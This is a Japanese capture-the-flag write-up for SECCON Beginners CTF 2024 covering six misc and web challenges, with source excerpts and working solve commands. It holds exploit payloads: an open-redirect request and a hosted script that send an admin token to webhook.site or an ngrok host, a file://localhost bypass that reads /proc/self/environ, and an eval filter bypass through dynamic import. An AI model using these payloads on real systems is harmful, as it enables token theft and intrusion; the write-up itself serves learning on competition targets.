---
title: "SECCON Beginners CTF 2024 Writeup"
id: "SECCON-Beginners-CTF-2024-Writeup"
description: "SECCON Beginners CTF 2024のWriteupです。"
author: "rikoteki"
createdAt: "2024-06-15"
isDraft: true
---

# misc

## getRank

`/`に数値文字列をPOSTすると`parseInt`され、最終的な数値が`10 ** 255`以上であればフラグが出力される模様。
ただし入力値の長さ上限が300文字となっており、単純に`100...00`のような値は弾かれる。
また、入力値の評価結果が`10 ** 255`より大きい場合、10による除算が100回行われるため、より大きい値を渡す必要がある。

```js
function chall(input: string): Res {
  if (input.length > 300) {
    return {
      rank: -1,
      message: "Input too long",
    };
  }

  let score = parseInt(input);
  if (isNaN(score)) {
    return {
      rank: -1,
      message: "Invalid score",
    };
  }
  if (score > 10 ** 255) {
    // hmm...your score is too big?
    // you need a handicap!
    for (let i = 0; i < 100; i++) {
      score = Math.floor(score / 10);
    }
  }

  return ranking(score);
}
```

```js
const RANKING = [10 ** 255, 1000, 100, 10, 1, 0];

type Res = {
  rank: number;
  message: string;
};

function ranking(score: number): Res {
  const getRank = (score: number) => {
    const rank = RANKING.findIndex((r) => score > r);
    return rank === -1 ? RANKING.length + 1 : rank + 1;
  };

  const rank = getRank(score);
  if (rank === 1) {
    return {
      rank,
      message: process.env.FLAG || "fake{fake_flag}",
    };
  } else {
    return {
      rank,
      message: `You got rank ${rank}!`,
    };
  }
}
```

ここで`parseInt`は16進数が評価されるため`0xFF..FFF`のような16進数が使える。
また、`"0x"+"F".repeat(298)`を`parseInt`すると`Infinity`となるためハンディキャップの除算も無視できる。

![image](https://github.com/r1k0t3k1/note/assets/57973603/d182eb3d-9e94-4bf3-9e70-9b3a9784e961)

```bash
curl -i -X 'POST' https://getrank.beginners.seccon.games/ \
-H 'Content-Type: application/json' \
--data-binary '{"input":"0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"}'
```

```
ctf4b{15_my_5c0r3_700000_b1g?}
```

## clamre

問題ファイル内に`ClamAV`の`.ldb`ファイルが存在する。

アップロードされたファイルがこのシグネチャにマッチするかをpythonで確認しているっぽい。

ldbファイルの内容は以下。

```
ClamoraFlag;Engine:81-255,Target:0;1;63746634;0/^((\x63\x74\x66)(4)(\x62)(\{B)(\x72)(\x33)\3(\x6b1)(\x6e\x67)(\x5f)\3(\x6c)\11\10(\x54\x68)\7\10(\x480)(\x75)(5)\7\10(\x52)\14\11\7(5)\})$/
```

`\xXX`の部分は単純にASCIIデコードすれば可読文字になる。

`\x63\x74\x66` → `ctf`

上記のようにデコードしていくが`\7`や`\10`のデコード方法がわからない。

そのままASCIIデコードすると制御文字になってしまう。

チームメンバーに確認したところ、`\X`の記法は正規表現のキャプチャグループ番号を表しているらしく、
`\7`であればキャプチャグループの7番目のルールを再利用することになるらしい。

以下の表であれば`(\x33)`にマッチする。

|number|該当箇所|
|------|-------|
|1|全体|
|2|(\x63\x74\x66)|
|3|(4)|
|4|(\x62)|
|5|(\{B)|
|6|(\x72)|
|7|(\x33)|
|8|(\x6b1)|
|9|(\x6e\x67)|
|10|(\x5f)|
|11|(\x6c)|
|12|(\x54\x68)|
|13|(\x480)|
|14|(\x75)|
|15|(5)|
|16|(\x52)|
|17|(5)|

この方法でデコードしていくとこのルールは以下にマッチするかを確認していることがわかった。

```
ctf4b{Br34k1ng_4ll_Th3_H0u53_Rul35}
```

# web

## wooorker

ログイン機能、管理者botへの報告機能があるサイト。

正常系機能を確認していく。

トップページからログイン画面に遷移すると、URLパラメータに`?next=/`が付与される。

ログイン機能では`guest:guest`でログインができる。

ログイン後にトップページへ遷移するがURLパラメータに`token={JWT_TOKEN}`が付与される。

このトークンに権限がないためか`Access denied`とアクセスが拒否される。

ソースコードを見ると、ログイン後ページの裏側でfetchが動いており`/flag`に管理者トークンが送信できればフラグが取得できる模様。

```js
app.get('/flag', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }

  try {
    const decoded = jwt.verify(token, jwtSecret);
    if (decoded.isAdmin) {
      const flag = FLAG;
      res.status(200).json({ flag });
    } else {
      res.status(403).json({ error: 'Access denied' });
    }
  } catch (error) {
    res.status(401).json({ error: 'Invalid token' });
  }
});
```

また、管理者への報告機能もあり任意のパスを渡すことで管理者botにそのページを閲覧させることが可能。

どうやって管理者トークンを入手するかだが、ログインページの`next`パラメータにオープンリダイレクトが存在するため、
ログインした管理者を任意のページに飛ばすことが可能。

このリダイレクトにはURLパラメータに管理者トークンが付与されている。

```js
loginWorker.onmessage = function(event) {
    const { token, error } = event.data;
    if (error) {
        document.getElementById('errorContainer').innerText = error;
        return;
    }
    if (token) {
        const params = new URLSearchParams(window.location.search);
        const next = params.get('next');

        if (next) {
            window.location.href = next.includes('token=') ? next: `${next}?token=${token}`;
        } else {
            window.location.href = `/?token=${token}`;
        }
    }
};
```

以下のようなリクエストを送信すると`webhook.site`にトークンを付与したリクエストが送信されるのでそのトークンを使ってログインすればフラグが取得できる。

```bash
curl -X 'POST' \
-H 'Content-Type: application/json' \
--data-binary '{"path":"/login?next=https://webhook.site/99bd18d1-0040-4dad-9fae-32aef0809f41"}' \
https://wooorker.beginners.seccon.games/report
```

```

```

## ssrforlfi

`url`パラメータに`http`、`https`、`file`　いずれかのスキームのURLを送信することでサーバがそのコンテンツを取得して表示してくれる。
ただし、文字制限や`http`,`https`の場合`localhost`という文字列が使えない、`file`URLの場合存在するファイルは取得できないなどの制限がある。

```python
import os
import re
import subprocess
from flask import Flask, request

app = Flask(__name__)


@app.route("/")
def ssrforlfi():
    url = request.args.get("url")
    if not url:
        return "Welcome to Website Viewer.<br><code>?url=http://example.com/</code>"

    # Allow only a-z, ", (, ), ., /, :, ;, <, >, @, |
    if not re.match('^[a-z"()./:;<>@|]*$', url):
        return "Invalid URL ;("

    # SSRF & LFI protection
    if url.startswith("http://") or url.startswith("https://"):
        if "localhost" in url:
            return "Detected SSRF ;("
    elif url.startswith("file://"):
        path = url[7:]
        if os.path.exists(path) or ".." in path:
            return "Detected LFI ;("
    else:
        # Block other schemes
        return "Invalid Scheme ;("

    try:
        # RCE ?
        proc = subprocess.run(
            f"curl '{url}'",
            capture_output=True,
            shell=True,
            text=True,
            timeout=1,
        )
    except subprocess.TimeoutExpired:
        return "Timeout ;("
    if proc.returncode != 0:
        return "Error ;("
    return proc.stdout


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=4989)
```

ただし、`file`URLが渡された場合、`file://`以降の文字列をファイルパスとして使用して`os.path.exists`を使用しているため、
`file://localhost/etc/passwd`などの記法が使える。

この場合`os.path.exists`に渡される文字列は`localhost/etc/passwd`となり存在確認は失敗する。

がcurlはファイルコンテンツを取得できるため制限を回避してファイルを参照することができた。

あとはフラグを取得するだけだが、フラグはファイルではなく環境変数として存在していたため、`/proc/self/environ`を読み取ることでフラグが取得できた。

```bash
curl --output - "https://ssrforlfi.beginners.seccon.games/?url=file://localhost/proc/self/environ"
```

```
UWSGI_ORIGINAL_PROC_NAME=uwsgiHOSTNAME=a84e51bef68dHOME=/home/ssrforlfiPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binLANG=C.UTF-8DEBIAN_FRONTEND=noninteractivePWD=/var/wwwTZ=Asia/TokyoUWSGI_RELOADS=0FLAG=ctf4b{1_7h1nk_bl0ck3d_b07h_55rf_4nd_lf1}
```

```
ctf4b{1_7h1nk_bl0ck3d_b07h_55rf_4nd_lf1}
```

## wooorker2

woorker2に修正が施されたらしい。

ソースを見るとたしかにリダイレクト時にトークンがURLパラメータではなくハッシュに付与されている。

![image](https://github.com/r1k0t3k1/note/assets/57973603/ee7a86d8-a26a-4166-94d6-ac462ffd1538)

ただし、オープンリダイレクト自体の修正は行われていないため、リダイレクト先のJSでハッシュを読み取ることは可能。

リダイレクト先に以下のようなHTMLをホストしておく。

```html
<html>
  <script>
    const flag = btoa(location.hash);
    const URL = "https://ff41-123-225-238-141.ngrok-free.app";
    location.href = `${URL}/?q=${flag}`;
  </script>
</html>
```

この状態でwooorkerと同様にリダイレクト先のURLを指定すると管理者が上記JSを踏んで最終的にトークン付きのリクエストが送信されてくる。

あとは取得したトークンを付与して`/flag`にアクセスすればフラグが取得できる。

## flagAlias

チームメイトが先に解いてくれていたが解法が別だったので記載。

入力値が`waf`でフィルタされ`eval`される。

```js
import * as flag from "./flag.ts";

function waf(key: string) {
  // Wonderful WAF :)
  const ngWords = [
    "eval",
    "Object",
    "proto",
    "require",
    "Deno",
    "flag",
    "ctf4b",
    "http",
  ];
  for (const word of ngWords) {
    if (key.includes(word)) {
      return "'NG word detected'";
    }
  }
  return key;
}

export async function chall(alias = "`real fl${'a'.repeat(10)}g`") {
  const m: { [key: string]: string } = {
    "wonderful flag": "fake{wonderful_fake_flag}",
    "special flag": "fake{special_fake_flag}",
  };
  try {
    // you can set the flag alias as the key
    const key = await eval(waf(alias));
    m[key] = flag.getFakeFlag();
    return JSON.stringify(Object.entries(m), null, 2);
  } catch (e) {
    return e.toString();
  }
}

const handler = async (request: Request): Promise<Response> => {
  try {
    const body = JSON.parse(await request.text());
    const alias = body?.alias;
    return new Response(await chall(alias), { status: 200 });
  } catch (_) {
    return new Response('{"error": "Internal Server Error"}', { status: 500 });
  }
};

if(Deno.version.deno !== "1.42.0"){
  console.log("Please use deno 1.42.0");
  Deno.exit(1);
}
const port = Number(Deno.env.get("PORT")) || 3000;
Deno.serve({ port }, handler);
```

フラグを出力する関数は`flag.ts`で定義されているが本番環境では関数名はわからなくなっているので呼び出すことができない。

```js
export function **FUNC_NAME_IS_REDACTED_PLEASE_RENAME_TO_RUN**() {
  // **REDACTED**
  return "**REDACTED**";
}

export function getFakeFlag() {
  return "fake{sorry. this isn't a flag. but, we wrote a flag in this file. try harder!}";
}
```

このフラグ関数を呼び出したいがこの関数があるモジュール名である`flag`という文字列は`waf`によってブロックされる。

`eval`内で`import`を使用して別名で定義しようとしたが`eval`内では`import`構文を使用すると怒られる。

```
SyntaxError: Cannot use import statement outside a module
```

調べると`dynamic import`という機能があり、`eval`内でも使えるものがあるらしい。

https://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Operators/import

この構文を利用して`flag`モジュールを`eval`内に別名で持ち込む。

最終的に以下のようなJSONを送信することで`flag`モジュールの関数を実行することができた。

```js
{"alias":"import(\"./fla\"+\"g.ts\").then(m => m.getFakeFlag())"}
```

次にフラグ関数名の特定だが、`Reflect.ownKeys()`が使える。

この関数は対象オブジェクトのプロパティキーの配列を返す。

`flag`モジュールに対してこの関数を実行すると、フラグ関数名が取得できる。

```bash
curl -X 'POST' \
-H 'Content-Type: application/json' \
--data-binary '{"alias":"import(\"./fla\"+\"g.ts\").then(m => Reflect.ownKeys(m).map(k=>k.toString()))"}' \
http://localhost:3000
```

```json
[
  [
    "wonderful flag",
    "fake{wonderful_fake_flag}"
  ],
  [
    "special flag",
    "fake{special_fake_flag}"
  ],
  [
    "getFakeFlag,getRealFlag_yUC2BwCtXEkg,Symbol(Symbol.toStringTag)",
    "fake{sorry. this isn't a flag. but, we wrote a flag in this file. try harder!}"
  ]
]⏎
```

あとは判明した関数を実行するだけ

```bash
curl -X 'POST' \
-H 'Content-Type: application/json' \
--data-binary '{"alias":"import(\"./fla\"+\"g.ts\").then(m => m.getRealFlag_yUC2BwCtXEkg())"}' \
http://localhost:3000
```
